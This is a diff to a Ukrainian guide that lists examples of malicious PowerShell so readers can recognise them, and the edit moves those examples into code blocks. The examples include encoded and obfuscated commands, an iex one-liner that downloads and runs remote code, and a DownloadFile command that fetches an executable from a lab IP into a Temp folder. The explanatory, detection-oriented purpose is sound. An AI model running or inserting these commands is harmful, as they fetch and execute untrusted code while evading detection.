@@ -49,18 +49,26 @@ PowerShell - це інструмент для автоматизації адм�
 
 ## 7. Приклади шкідливих та підозрілих команди Powershell
 1. Закодовані команди, містять в собі encoded, en, enc, та подібні параметри:
-`powershell.exe -encod VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA==`
-2. Використання base64 для закодовування шкідливих команд:
-`Invoke-Expression -Command ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA==')))`
-3. Використання спеціальних символів (^, +, $ та %) щоб розбити команду на текстові блоки і оминати примітивні правила детектування:
-`& ([ScriptBlock]::Create("Write-Host '$("{0}{1}{2}{2}{0}" -f 't','w','e'), $([Char] 116)$([Char] 119)$("$(([Char] 0x65))" * 2)t'"))`
+```
+powershell.exe -encod VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA==
+```
+3. Використання base64 для закодовування шкідливих команд:
+```
+Invoke-Expression -Command ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA==')))
+```
+4. Використання спеціальних символів (^, +, $ та %) щоб розбити команду на текстові блоки і оминати примітивні правила детектування:
+```
+& ([ScriptBlock]::Create("Write-Host '$("{0}{1}{2}{2}{0}" -f 't','w','e'), $([Char] 116)$([Char] 119)$("$(([Char] 0x65))" * 2)t'"))`
+```
 4. Використання параметрів -nop, -noni. Команда виконується без інтерактивного вікна.
 5. Використання invoke-expression чи iex щоб запустити команди, що скачуються з  віддаленого ресурсу
 ```
 powershell.exe -nop iex "\"Write-Host `\"$((New-Object Net.WebClient).DownloadString('https://user.github.com/repo/blabla/badcode.txt'))`\"\""
 ```
 6. Скачування файлу з віддаленого ресурсу з downloadfile:
-`(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")`
+```
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+```
 
 [Більше інформації про шкідливе використання Powershell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
 
